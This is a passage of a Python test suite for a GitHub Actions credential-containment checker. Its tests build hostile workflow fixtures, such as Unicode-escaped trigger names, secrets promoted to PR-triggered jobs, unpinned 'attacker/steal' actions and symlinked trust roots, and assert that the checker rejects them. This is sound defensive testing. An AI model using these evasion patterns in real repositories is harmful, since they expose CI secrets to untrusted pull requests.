            "WORKFLOW_HEAD_SHA: ${{ github.sha }}",
            1,
        )
        violations = self.check_fixture("preview.yml", workflow)
        self.assertTrue(
            any(
                "preview artifact metadata environment is not exact" in item
                for item in violations
            )
        )

    def test_escaped_pull_request_event_is_rejected(self) -> None:
        workflow = """\
name: hostile
on: ["pull_requ\\u0065st"]
jobs:
  collect:
    runs-on: ubuntu-latest
    env:
      ALTERNATE_TOKEN: ${{ secrets.ALTERNATE_TOKEN }}
    steps:
      - run: ./payload/run.sh
"""
        violations = self.check_fixture("hostile.yaml", workflow)
        self.assertTrue(any("escaped YAML character" in item for item in violations))

    def test_live_eval_secret_cannot_be_moved_to_a_pr_trigger(self) -> None:
        workflow = self.read(".github/workflows/engine-evals-live.yml").replace(
            "on:\n",
            "on:\n  pull_request:\n",
            1,
        )
        violations = self.check_fixture("engine-evals-live.yml", workflow)
        self.assertTrue(any("pull-request trigger" in item for item in violations))

    def test_live_eval_job_cannot_add_a_second_model_key_step(self) -> None:
        workflow = self.read(".github/workflows/engine-evals-live.yml").replace(
            "      - name: Upload scorecard\n",
            "      - name: Unexpected model-key consumer\n"
            "        env:\n"
            "          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n"
            "        run: echo unexpected\n\n"
            "      - name: Upload scorecard\n",
            1,
        )
        violations = self.check_fixture("engine-evals-live.yml", workflow)
        self.assertTrue(any("secret reference is not exact" in item for item in violations))
        self.assertTrue(any("steps are not exact" in item for item in violations))

    def test_live_eval_workflow_cannot_add_an_unvalidated_job(self) -> None:
        workflow = self.read(".github/workflows/engine-evals-live.yml").replace(
            "jobs:\n  evals:\n",
            "jobs:\n"
            "  shadow:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo unvalidated\n\n"
            "  evals:\n",
            1,
        )
        violations = self.check_fixture("engine-evals-live.yml", workflow)
        self.assertTrue(any("workflow jobs are not exact" in item for item in violations))

    def test_live_eval_secret_cannot_be_promoted_to_workflow_environment(self) -> None:
        workflow = self.read(".github/workflows/engine-evals-live.yml").replace(
            "permissions:\n",
            "env:\n"
            "  ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n\n"
            "permissions:\n",
            1,
        )
        violations = self.check_fixture("engine-evals-live.yml", workflow)
        self.assertTrue(any("workflow keys are not exact" in item for item in violations))
        self.assertTrue(any("secret reference is not exact" in item for item in violations))

    def test_policy_workflow_cannot_replace_enforcement_with_a_noop(self) -> None:
        workflow = """\
name: ci-security-policy
on:
  pull_request_target:
    types: [opened, reopened, synchronize]
    branches: [main]
    paths:
      - '.github/**'
permissions:
  contents: read
jobs:
  credential-containment:
    runs-on: ubuntu-latest
    steps:
      - name: Check out exact candidate policy input
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.event.pull_request.head.sha }}
          path: candidate
          persist-credentials: false
          allow-unsafe-pr-checkout: true
      - name: Disable policy
        run: echo policy-disabled
"""
        violations = self.check_fixture("ci-security-policy.yml", workflow)
        self.assertTrue(any("security policy steps are not exact" in item for item in violations))

    def test_policy_workflow_job_cannot_be_skipped(self) -> None:
        workflow = self.read(".github/workflows/ci-security-policy.yml").replace(
            "    name: Credential containment policy\n",
            "    name: Credential containment policy\n    if: false\n",
            1,
        )
        violations = self.check_fixture("ci-security-policy.yml", workflow)
        self.assertTrue(
            any("security policy job keys are not exact" in item for item in violations)
        )

    def test_policy_workflow_cannot_add_an_untrusted_event(self) -> None:
        workflow = self.read(".github/workflows/ci-security-policy.yml").replace(
            "on:\n",
            "on:\n  push:\n    branches: [main]\n",
            1,
        )
        violations = self.check_fixture("ci-security-policy.yml", workflow)
        self.assertTrue(any("security policy events are not exact" in item for item in violations))

    def test_unknown_privileged_event_workflows_fail_closed(self) -> None:
        workflow_run = """\
name: hostile
on:
  workflow_run:
    workflows: [rocky-preview]
    types: [completed]
permissions:
  contents: write
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - run: echo unsafe
"""
        violations = self.check_fixture("hostile.yml", workflow_run)
        self.assertTrue(
            any("workflow_run workflow is not allow-listed" in item for item in violations)
        )

        pull_request_target = """\
name: hostile
on:
  pull_request_target:
permissions:
  contents: read
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - uses: attacker/steal@1111111111111111111111111111111111111111
"""
        violations = self.check_fixture("hostile.yml", pull_request_target)
        self.assertTrue(
            any("pull_request_target workflow is not allow-listed" in item for item in violations)
        )

    def test_candidate_jobs_reject_reusable_and_mutable_actions(self) -> None:
        reusable = """\
name: hostile
on:
  pull_request:
permissions:
  contents: read
jobs:
  payload:
    uses: attacker/steal/.github/workflows/leak.yml@1111111111111111111111111111111111111111
"""
        violations = self.check_fixture("hostile.yml", reusable)
        self.assertTrue(any("must not call a reusable workflow" in item for item in violations))

        mutable = """\
name: hostile
on:
  pull_request:
permissions:
  contents: read
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
      - uses: attacker/steal@main
"""
        violations = self.check_fixture("hostile.yml", mutable)
        self.assertTrue(any("not pinned to a full SHA" in item for item in violations))

    def test_noncanonical_privileged_event_forms_fail_closed(self) -> None:
        forms = (
            "  {event} :",
            "  {event}: # hidden event",
            "  {event}: {{}}",
            "  - {event} # sequence event",
            "  [{event}]",
        )
        for event in ("pull_request", "pull_request_target", "workflow_run"):
            for form in forms:
                with self.subTest(event=event, form=form):
                    workflow = f"""\
name: hostile
on:
{form.format(event=event)}
permissions:
  contents: write
jobs:
  payload:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo ${{{{ secrets.TOP_SECRET }}}}
"""
                    violations = self.check_fixture("hostile.yml", workflow)
                    self.assertTrue(
                        any("canonical block mapping" in item for item in violations)
                    )

    def test_action_step_key_spelling_cannot_hide_a_mutable_action(self) -> None:
        for step in (
            '      - "uses": attacker/steal@main',
            "      - 'uses': attacker/steal@main",
            "      - uses : attacker/steal@main",
            "      - {uses: attacker/steal@main}",
        ):
            with self.subTest(step=step):
                workflow = f"""\
name: hostile
on:
  pull_request:
permissions:
  contents: read
jobs:
  payload:
    runs-on: ubuntu-latest
    steps:
{step}
"""
                violations = self.check_fixture("hostile.yml", workflow)
                self.assertTrue(
                    any(
                        marker in item
                        for item in violations
                        for marker in (
                            "quoted YAML key",
                            "spacing before a YAML key colon",
                            "flow-style sequence mapping",
                        )
                    )
                )

    def test_ai_context_action_sequence_is_exact(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml").replace(
            "      - name: Upload untrusted context artifact\n",
            "      - name: Unexpected pinned action\n"
            "        uses: attacker/steal@1111111111111111111111111111111111111111\n\n"
            "      - name: Upload untrusted context artifact\n",
            1,
        )
        violations = self.check_fixture("ai-review.yml", workflow)
        self.assertTrue(any("AI context steps are not exact" in item for item in violations))

    def test_every_frozen_trust_root_must_match_the_trusted_base(self) -> None:
        for relative_path in FROZEN_TRUST_ROOTS:
            with (
                self.subTest(relative_path=relative_path),
                tempfile.TemporaryDirectory() as directory,
            ):
                root = Path(directory)
                shutil.copytree(REPOSITORY_ROOT / ".github", root / ".github")
                candidate = root / relative_path
                candidate.write_bytes(candidate.read_bytes() + b"\n# unreviewed replacement\n")
                violations = check_repository(root)
                self.assertTrue(
                    any(
                        relative_path in item and "frozen trust root differs" in item
                        for item in violations
                    )
                )

    def test_unexpected_trusted_script_siblings_fail_closed(self) -> None:
        for relative_path in (".github/scripts/json.py", ".github/scripts/urllib"):
            with (
                self.subTest(relative_path=relative_path),
                tempfile.TemporaryDirectory() as directory,
            ):
                root = Path(directory)
                shutil.copytree(REPOSITORY_ROOT / ".github", root / ".github")
                unexpected = root / relative_path
                if unexpected.suffix:
                    unexpected.write_text("raise RuntimeError('shadow import')\n")
                else:
                    unexpected.mkdir()
                    (unexpected / "__init__.py").write_text(
                        "raise RuntimeError('shadow import')\n"
                    )
                violations = check_repository(root)
                self.assertTrue(
                    any("unexpected trusted-script entry" in item for item in violations)
                )

    def test_symlinked_frozen_trust_root_parents_fail_closed(self) -> None:
        for relative_path in (
            ".github/scripts",
            ".github/actions/rocky-ai-review",
            ".github/tests",
        ):
            with (
                self.subTest(relative_path=relative_path),
                tempfile.TemporaryDirectory() as directory,
            ):
                root = Path(directory)
                shutil.copytree(REPOSITORY_ROOT / ".github", root / ".github")
                parent = root / relative_path
                real_parent = root / f"real-{parent.name}"
                parent.rename(real_parent)
                parent.symlink_to(real_parent, target_is_directory=True)
                violations = check_repository(root)
                self.assertTrue(
                    any("parent is missing or unsafe" in item for item in violations)
                    or any("must be a real directory" in item for item in violations)
                )

    def test_duplicate_permission_key_fails_closed(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml").replace(
            "permissions:\n  contents: read\n",
            "permissions:\n  contents: read\n\npermissions:\n  contents: write\n",
            1,
        )
        violations = self.check_fixture("engine-evals.yml", workflow)
        self.assertTrue(any("duplicate top-level" in item for item in violations))


class WorkflowPolicyTests(unittest.TestCase):
    def read(self, relative_path: str) -> str:
        return (REPOSITORY_ROOT / relative_path).read_text()

    def test_ai_review_has_two_job_trust_split_and_sync_invalidation(self) -> None:
        workflow = self.read(".github/workflows/ai-review.yml")
        self.assertIn("  pull_request_target:", workflow)
        self.assertIn("types: [labeled, synchronize]", workflow)
        self.assertIn("branches: [main]", workflow)
        self.assertNotIn("    paths:", workflow)
        self.assertIn("cancel-in-progress: true", workflow)
        self.assertIn("removeLabel", workflow)
        self.assertIn("needs: context", workflow)
        self.assertIn("CONTEXT_RUN_ID: ${{ github.run_id }}", workflow)
        self.assertEqual(workflow.count("ref: ${{ github.workflow_sha }}"), 2)
        self.assertIn("APPROVED_BASE_REF: main", workflow)
        self.assertIn("APPROVED_BASE_REPOSITORY: ${{ github.repository }}", workflow)

        context_job, privileged_job = workflow.split("  ai-review:\n", maxsplit=1)
        self.assertNotIn("secrets.", context_job)
        self.assertNotIn("environment:", context_job)
        self.assertIn("allow-unsafe-pr-checkout: true", context_job)
        self.assertGreaterEqual(context_job.count("persist-credentials: false"), 2)
        self.assertIn("uses: ./trusted/.github/actions/rocky-ai-review", privileged_job)
        self.assertNotIn("allow-unsafe-pr-checkout", privileged_job)
        self.assertNotIn("path: candidate", privileged_job)
        self.assertIn("environment:\n      name: credentialed-pr-review", privileged_job)

    def test_secret_bearing_action_uses_only_trusted_tooling(self) -> None:
        action = self.read(".github/actions/rocky-ai-review/action.yml")
        self.assertNotIn("raw.githubusercontent.com/rocky-data/rocky/main", action)
        self.assertIn("${{ github.action_path }}/../../../engine/install.sh", action)
        self.assertIn("context_directory", action)
        self.assertIn("Revalidate approved PR head", action)
        self.assertLess(
            action.index("- name: Revalidate approved PR head"),
            action.index("- name: Run AI review"),
        )
        self.assertIn("github.event_name == 'pull_request_target'", action)

    def test_policy_workflow_never_executes_candidate_tests(self) -> None:
        workflow = self.read(".github/workflows/ci-security-policy.yml")
        self.assertIn("pull_request_target:", workflow)
        self.assertIn("branches: [main]", workflow)
        self.assertIn("ref: ${{ github.workflow_sha }}", workflow)
        self.assertIn("ref: ${{ github.event.pull_request.head.sha }}", workflow)
        self.assertIn(
            "python3 trusted/.github/scripts/check_credential_containment.py",
            workflow,
        )
        self.assertNotIn("Run executable workflow-policy regressions", workflow)
        self.assertNotIn("secrets.", workflow)
        self.assertNotIn("environment:", workflow)
        tests = self.read(".github/workflows/ci-security-policy-tests.yml")
        self.assertIn("  pull_request:", tests)
        self.assertNotIn("pull_request_target", tests)
        self.assertIn("Run executable workflow-policy regressions", tests)

    def test_pr_evals_have_no_secret_or_protected_environment(self) -> None:
        workflow = self.read(".github/workflows/engine-evals.yml")
        for forbidden in (
            "secrets.",
            "ANTHROPIC_API_KEY",
            "environment:",
            "@anthropic-ai/claude-code",
        ):
            self.assertNotIn(forbidden, workflow)
        self.assertIn("  pull_request:", workflow)
        self.assertNotIn("pull_request_target", workflow)
        self.assertNotIn("allow-unsafe-pr-checkout", workflow)
        self.assertIn("persist-credentials: false", workflow)

    def test_preview_execution_and_commenting_use_separate_trust_domains(self) -> None:
        producer = self.read(".github/workflows/preview.yml")
        consumer = self.read(".github/workflows/preview-comment.yml")
        self.assertIn("  pull_request:", producer)
        self.assertNotIn("pull_request_target", producer)
        self.assertNotIn("pull-requests: write", producer)
        self.assertIn("  workflow_run:", consumer)
        self.assertNotIn("path: candidate", consumer)
        self.assertIn("pull-requests: write", consumer)
        self.assertIn("post-workflow-run", consumer)

    def test_ai_context_scrubs_runner_credentials_and_replaces_candidate_config(self) -> None:
        collector = self.read(".github/scripts/collect_ai_review_context.py")
        self.assertIn("shutil.copyfile(TRUSTED_CONFIG_PATH", collector)
        self.assertIn('"PATH": os.environ.get("PATH"', collector)
        for credential in (
            "ACTIONS_RUNTIME_TOKEN",
            "GITHUB_TOKEN",
            "ANTHROPIC_API_KEY",
        ):
            self.assertNotIn(f'"{credential}": os.environ', collector)

    def test_live_evals_are_exact_main_code_behind_environment(self) -> None:
        workflow = self.read(".github/workflows/engine-evals-live.yml")
        self.assertNotIn("  pull_request:", workflow)
        self.assertNotIn("  pull_request_target:", workflow)
        self.assertIn("branches: [main]", workflow)
        self.assertIn("if: github.ref == 'refs/heads/main'", workflow)
        self.assertIn("environment:\n      name: credentialed-ci", workflow)
        self.assertIn("ref: ${{ github.sha }}", workflow)
        self.assertIn("persist-credentials: false", workflow)
        self.assertIn("@anthropic-ai/claude-code@2.1.207", workflow)
        self.assertIn("DISABLE_AUTOUPDATER: '1'", workflow)
        self.assertIn("DISABLE_UPDATES: '1'", workflow)
        self.assertNotIn("npm install -g @anthropic-ai/claude-code\n", workflow)

    def test_model_key_occurs_only_in_environment_gated_workflows(self) -> None:
        workflows = REPOSITORY_ROOT / ".github" / "workflows"
        secret_workflows = {
            path.name
            for path in workflows.iterdir()
            if path.suffix in {".yml", ".yaml"}
            if "ANTHROPIC_API_KEY" in path.read_text()
        }
        self.assertEqual(secret_workflows, {"ai-review.yml", "engine-evals-live.yml"})
        for name in secret_workflows:
            self.assertIn("environment:", (workflows / name).read_text())

        environment_policy = self.read(".github/SECURITY_ENVIRONMENTS.md")
        self.assertEqual(environment_policy.count("Require at least one trusted reviewer"), 2)
        self.assertEqual(environment_policy.count("prevent self-review"), 2)


if __name__ == "__main__":
    unittest.main()
